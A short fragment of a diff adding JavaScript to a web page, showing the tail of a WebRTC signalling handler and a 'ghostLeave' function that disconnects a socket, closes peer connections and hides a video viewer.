+                    ghostSocket.emit('signal', { to: peerId, signal: pc.localDescription });
+                } catch(e) {}
+            }
+        }
+
+        function ghostLeave() {
+            if (ghostSocket) { ghostSocket.disconnect(); ghostSocket = null; }
+            Object.values(ghostPeers).forEach(pc => pc.close());
+            ghostPeers = {};
+            ghostRoom = null;
+            document.getElementById('ghostViewer').style.display = 'none';
+            document.getElementById('ghostVideos').innerHTML = '';
+        }
+
+        document.getElementById('ghostLeaveBtn').addEventListener('click', ghostLeave);
+
+    </script>
+</body>
+</html>
